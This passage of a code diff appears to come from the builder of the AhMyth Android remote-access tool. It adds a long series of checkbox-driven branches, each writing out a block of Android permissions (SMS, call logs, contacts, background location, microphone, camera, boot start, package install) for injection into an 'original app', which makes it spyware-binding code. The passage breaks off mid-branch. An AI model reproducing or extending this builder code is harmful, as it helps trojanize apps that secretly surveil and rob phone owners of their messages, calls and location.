+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         ` 
+        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         ` 
+        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         ` 
+        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         ` 
+        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+
+            `
+        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>         `
+        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         `
+        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>         `
+        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>         ` 
+        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>            ` 
+        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>  `
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>         ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+
+            `
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>         ` 
+        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>         `
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
+        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+
+            `
+        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>         ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
+        }
 
 
-    // fuction to copy all the ahmyth permissions to the orginal app
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+
+            `
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
